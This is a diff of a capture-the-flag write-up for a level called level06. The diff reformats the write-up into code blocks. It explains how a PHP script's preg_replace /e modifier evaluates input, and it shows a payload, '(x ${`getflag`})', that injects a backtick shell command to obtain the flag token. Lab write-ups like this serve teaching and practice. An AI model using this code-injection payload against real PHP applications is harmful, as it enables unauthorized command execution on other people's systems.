@@ -1,7 +1,9 @@
-COMMAND: ls
-RESUSLT: level06  level06.php
+```sh
+$: ls
+level06  level06.php
+```
 
-*php script explanation*
+**php script explanation**
 
 
 The script defines a function y($m) that takes a string $m as input and performs two replacements:
@@ -28,9 +30,8 @@ and the result of that evaluation is used as the replacement.
 
 So we will make the script execute the getflag command.
 
-COMMAND: echo '(x ${`getflag`})' > /tmp/file     *we write the [x (.*)] pattern so the /e mdifier is used
-RESULT: 
+```sh
+$: echo '(x ${`getflag`})' > /tmp/file     *we write the [x (.*)] pattern so the /e mdifier is used
 PHP Notice:  Undefined variable: Check flag.Here is your token : *****flag*****
  in /home/user/level06/level06.php(4) : regexp code on line 1
-
-
+```
